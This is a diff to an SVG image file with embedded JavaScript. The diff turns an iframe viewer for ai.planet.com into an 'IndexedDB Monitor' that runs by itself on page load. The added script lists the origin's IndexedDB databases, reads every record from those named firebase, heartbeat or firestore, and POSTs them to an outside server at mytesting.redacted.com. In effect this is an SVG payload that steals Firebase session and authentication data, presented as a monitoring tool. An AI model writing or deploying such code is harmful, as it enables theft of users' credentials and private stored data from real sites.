@@ -1,205 +1,204 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1000 800">
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1200 800">
     <defs>
         <style>
             text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
             .header { font-weight: bold; fill: #1a1a1a; }
-            .subheader { fill: #666; }
-            .status-good { fill: #4CAF50; }
-            .status-warning { fill: #FF9800; }
-            .info-text { fill: #555; font-size: 13px; }
+            .db-status { font-size: 14px; }
         </style>
-        
-        <!-- Gradient for header -->
         <linearGradient id="headerGrad" x1="0%" y1="0%" x2="100%" y2="0%">
             <stop offset="0%" style="stop-color:#1a237e;stop-opacity:1" />
             <stop offset="100%" style="stop-color:#0d47a1;stop-opacity:1" />
         </linearGradient>
-        
-        <!-- Shadow filter -->
-        <filter id="shadow" x="-2%" y="-2%" width="104%" height="104%">
-            <feDropShadow dx="0" dy="2" stdDeviation="4" flood-opacity="0.15"/>
-        </filter>
     </defs>
     
-    <!-- Background -->
-    <rect width="1000" height="800" fill="#f5f7fa" rx="12"/>
+    <rect width="1200" height="800" fill="#f5f7fa" rx="12"/>
     
     <!-- Header -->
-    <rect x="0" y="0" width="1000" height="70" fill="url(#headerGrad)" rx="12 12 0 0"/>
-    <text x="30" y="44" class="header" fill="white" font-size="22">
-        🌍 ai.planet.com
-    </text>
-    <text x="850" y="44" fill="white" font-size="13" text-anchor="end">
-        Loaded from blob:${window.location.origin}
-    </text>
+    <rect x="0" y="0" width="1200" height="60" fill="url(#headerGrad)" rx="12 12 0 0"/>
+    <text x="30" y="38" class="header" fill="white" font-size="20">🔍 IndexedDB Monitor</text>
+    <text x="800" y="38" fill="white" font-size="13">Origin: ${window.location.origin}</text>
     
-    <!-- Status Bar -->
-    <rect x="20" y="85" width="960" height="35" fill="white" rx="6" filter="url(#shadow)"/>
-    <circle cx="40" cy="102" r="6" fill="#4CAF50"/>
-    <text x="55" y="107" class="info-text" fill="#333">
-        Status: Connected  •  Origin: <tspan fill="#1a237e" font-weight="bold">${window.location.origin}</tspan>  •  Auth: ✅ Active
-    </text>
+    <!-- Status Panel -->
+    <rect x="20" y="75" width="1160" height="200" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
+    <text x="40" y="105" font-weight="bold" fill="#333" font-size="16">📊 Database Status</text>
     
-    <!-- Iframe Container -->
-    <foreignObject x="20" y="135" width="960" height="645">
+    <!-- Status display area -->
+    <foreignObject x="40" y="120" width="1120" height="140">
+        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#fafafa;border-radius:4px;padding:10px;border:1px solid #e0e0e0;">
+            <div id="statusLog">Initializing...</div>
+        </div>
+    </foreignObject>
+    
+    <!-- Main iframe -->
+    <foreignObject x="20" y="290" width="1160" height="490">
         <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;">
             <iframe 
                 id="planetIframe"
-                src="https://ai.planet.com/profile" 
+                src="https://ai.planet.com/" 
                 style="width:100%;height:100%;border:2px solid #e0e0e0;border-radius:8px;background:white;"
                 sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals"
                 allow="geolocation; microphone; camera; midi; encrypted-media; autoplay; fullscreen"
                 allowfullscreen="true"
-                loading="eager"
             ></iframe>
         </div>
     </foreignObject>
     
-    <!-- Footer -->
-    <rect x="0" y="790" width="1000" height="10" fill="url(#headerGrad)" rx="0 0 12 12"/>
-    <text x="500" y="795" text-anchor="middle" fill="white" font-size="10" opacity="0.8">
-        Secure blob URL • ${new Date().toLocaleString()}
-    </text>
-    
-    <!-- JavaScript for monitoring and interaction -->
     <script type="text/javascript">
         <![CDATA[
             console.clear();
             console.log('═══════════════════════════════════════');
-            console.log('🌍 AI.PLANET.COM - BLOB URL VIEWER');
+            console.log('🔍 INDEXEDDB MONITOR');
             console.log('═══════════════════════════════════════');
-            console.log('✅ SVG loaded successfully');
-            console.log('📍 Origin:', window.location.origin);
-            console.log('📍 URL:', window.location.href);
-            console.log('📌 Mode: Blob URL (same origin)');
             
-            // Track iframe loading
-            var iframeLoadStatus = {
-                loaded: false,
-                attempts: 0,
-                startTime: Date.now()
-            };
+            const statusLog = document.getElementById('statusLog');
             
-            function checkIframe() {
-                var iframe = document.getElementById('planetIframe');
-                if (!iframe) {
-                    console.warn('⚠️ Iframe not found');
-                    return;
+            function logStatus(message, isError = false) {
+                const timestamp = new Date().toLocaleTimeString();
+                const entry = `[${timestamp}] ${message}`;
+                console.log(entry);
+                if (statusLog) {
+                    statusLog.innerHTML += `<div style="color:${isError ? '#d32f2f' : '#333'}">${entry}</div>`;
+                    statusLog.scrollTop = statusLog.scrollHeight;
                 }
-                
-                iframeLoadStatus.attempts++;
-                
+            }
+            
+            async function exploreIndexedDB() {
                 try {
-                    // Try to access iframe content
-                    var doc = iframe.contentDocument || iframe.contentWindow?.document;
+                    logStatus('📌 Checking IndexedDB...');
                     
-                    if (doc && doc.readyState === 'complete') {
-                        if (!iframeLoadStatus.loaded) {
-                            iframeLoadStatus.loaded = true;
-                            var loadTime = (Date.now() - iframeLoadStatus.startTime) / 1000;
-                            console.log('✅ IFRAME LOADED SUCCESSFULLY!');
-                            console.log('  📍 Time to load:', loadTime.toFixed(2) + 's');
-                            console.log('  📍 Title:', doc.title || 'No title');
-                            console.log('  📍 Content length:', doc.body?.innerHTML?.length || 0);
-                            console.log('  📍 readyState:', doc.readyState);
+                    // List all databases
+                    const databases = await indexedDB.databases();
+                    logStatus(`✅ Found ${databases.length} databases`);
+                    
+                    const dbNames = databases.map(db => db.name);
+                    logStatus(`📌 Database names: ${dbNames.join(', ')}`);
+                    
+                    // Look for Firebase databases
+                    const firebaseDBs = dbNames.filter(name => 
+                        name.includes('firebase') || 
+                        name.includes('heartbeat') ||
+                        name.includes('firestore')
+                    );
+                    
+                    if (firebaseDBs.length === 0) {
+                        logStatus('⚠️ No Firebase databases found');
+                        return null;
+                    }
+                    
+                    logStatus(`✅ Found Firebase databases: ${firebaseDBs.join(', ')}`);
+                    
+                    const allData = {};
+                    
+                    for (const dbName of firebaseDBs) {
+                        logStatus(`📌 Opening database: ${dbName}`);
+                        
+                        const db = await new Promise((resolve, reject) => {
+                            const request = indexedDB.open(dbName);
+                            request.onsuccess = () => resolve(request.result);
+                            request.onerror = () => reject(request.error);
+                        });
+                        
+                        logStatus(`✅ Opened ${dbName} with ${db.objectStoreNames.length} stores`);
+                        logStatus(`📌 Stores: ${Array.from(db.objectStoreNames).join(', ')}`);
+                        
+                        // Get data from each store
+                        const storeData = {};
+                        for (const storeName of db.objectStoreNames) {
+                            logStatus(`📌 Reading store: ${storeName}`);
                             
-                            // Update status display
-                            updateStatus('✅ Connected', '#4CAF50');
-                        }
-                    } else if (doc) {
-                        console.log('⏳ Iframe loading... (readyState:', doc.readyState || 'unknown', ')');
-                    }
-                } catch(e) {
-                    // CORS or other access issues
-                    if (!iframeLoadStatus.loaded) {
-                        // If we can detect that it loaded despite CORS
-                        try {
-                            // Check if iframe has a src and is not about:blank
-                            if (iframe.src && iframe.src !== 'about:blank' && iframe.src.startsWith('https://')) {
-                                console.log('✅ Iframe appears to be loaded (CORS prevents content access)');
-                                console.log('  📍 This is normal for cross-origin iframes');
-                                console.log('  📌 Content is loaded but cannot be inspected');
-                                iframeLoadStatus.loaded = true;
-                                updateStatus('✅ Connected (CORS)', '#4CAF50');
+                            const data = await new Promise((resolve, reject) => {
+                                const transaction = db.transaction(storeName, 'readonly');
+                                const store = transaction.objectStore(storeName);
+                                const request = store.getAll();
+                                request.onsuccess = () => resolve(request.result);
+                                request.onerror = () => reject(request.error);
+                            });
+                            
+                            storeData[storeName] = data;
+                            logStatus(`✅ Retrieved ${data.length} records from ${storeName}`);
+                            
+                            if (data.length > 0) {
+                                logStatus(`📍 Sample: ${JSON.stringify(data[0]).substring(0, 200)}...`);
                             }
-                        } catch(e2) {
-                            // Ignore
                         }
+                        
+                        allData[dbName] = storeData;
+                        db.close();
                     }
+                    
+                    return allData;
+                    
+                } catch (error) {
+                    logStatus(`❌ Error: ${error.message}`, true);
+                    console.error('Error details:', error);
+                    return null;
                 }
             }
             
-            function updateStatus(text, color) {
+            async function sendToServer(data) {
                 try {
-                    var statusText = document.querySelector('.info-text');
-                    if (statusText) {
-                        // Find the status part
-                        var parts = statusText.textContent.split('•');
-                        if (parts.length >= 2) {
-                            statusText.textContent = 'Status: ' + text + '  •' + parts.slice(1).join('•');
-                        }
+                    logStatus('📤 Sending data to server...');
+                    
+                    const response = await fetch('https://mytesting.redacted.com/api/indexeddb', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            source: window.location.origin,
+                            url: window.location.href,
+                            timestamp: new Date().toISOString(),
+                            data: data
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        const result = await response.json();
+                        logStatus(`✅ Data sent successfully! Response: ${JSON.stringify(result)}`);
+                    } else {
+                        logStatus(`❌ Server error: ${response.status} ${response.statusText}`, true);
                     }
-                } catch(e) {
-                    // Ignore
+                } catch (error) {
+                    logStatus(`❌ Error sending to server: ${error.message}`, true);
                 }
             }
             
-            // Monitor iframe loading
-            var checkInterval = setInterval(checkIframe, 500);
-            
-            // Also check on window load
-            window.addEventListener('load', function() {
-                console.log('📌 Window load event fired');
-                setTimeout(checkIframe, 500);
-            });
-            
-            // Stop checking after 30 seconds
-            setTimeout(function() {
-                clearInterval(checkInterval);
-                if (!iframeLoadStatus.loaded) {
-                    console.log('⏱️ Timeout: Iframe may still be loading or blocked');
-                    console.log('  📌 Check if authentication is required');
-                    console.log('  📌 Check if iframe is visible');
-                }
-                console.log('\n═══════════════════════════════════════');
-                console.log('📊 FINAL STATUS:');
-                console.log('  📍 Iframe loaded:', iframeLoadStatus.loaded ? '✅ YES' : '❌ NO');
-                console.log('  📍 Attempts:', iframeLoadStatus.attempts);
-                console.log('  📍 Total time:', ((Date.now() - iframeLoadStatus.startTime) / 1000).toFixed(2) + 's');
+            // Main execution
+            async function main() {
+                logStatus('═══════════════════════════════════');
+                logStatus('🚀 Starting IndexedDB exploration');
+                logStatus(`📍 Origin: ${window.location.origin}`);
                 
-                // Check if iframe exists
-                var iframe = document.getElementById('planetIframe');
-                if (iframe) {
-                    console.log('  📍 Iframe src:', iframe.src);
-                    console.log('  📍 Iframe style:', iframe.style.cssText);
+                const data = await exploreIndexedDB();
+                
+                if (data) {
+                    logStatus(`\n📊 Summary:`);
+                    const totalRecords = Object.values(data).reduce((sum, db) => {
+                        const storeRecords = Object.values(db).reduce((s, store) => s + store.length, 0);
+                        return sum + storeRecords;
+                    }, 0);
+                    logStatus(`  ✅ Total databases: ${Object.keys(data).length}`);
+                    logStatus(`  ✅ Total records: ${totalRecords}`);
+                    
+                    // Send to server
+                    await sendToServer(data);
+                } else {
+                    logStatus('⚠️ No data to send');
                 }
-                console.log('═══════════════════════════════════════');
-            }, 30000);
+                
+                logStatus('\n✅ Complete!');
+                logStatus('═══════════════════════════════════');
+            }
             
-            // Add keyboard shortcuts
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'r' && (e.ctrlKey || e.metaKey)) {
-                    e.preventDefault();
-                    console.log('🔄 Reloading iframe...');
-                    var iframe = document.getElementById('planetIframe');
-                    if (iframe) {
-                        iframe.src = iframe.src;
-                    }
-                }
-                if (e.key === 'f' && (e.ctrlKey || e.metaKey)) {
-                    e.preventDefault();
-                    console.log('🔍 Toggle fullscreen...');
-                    var iframe = document.getElementById('planetIframe');
-                    if (iframe && iframe.requestFullscreen) {
-                        iframe.requestFullscreen();
-                    }
-                }
+            // Run after page loads
+            window.addEventListener('load', function() {
+                setTimeout(main, 1000);
             });
             
-            console.log('\n📌 Keyboard shortcuts:');
-            console.log('  Ctrl+R  - Reload iframe');
-            console.log('  Ctrl+F  - Toggle fullscreen');
-            console.log('═══════════════════════════════════════');
+            // Also run now if already loaded
+            if (document.readyState === 'complete') {
+                setTimeout(main, 500);
+            }
         ]]>
     </script>
 </svg>
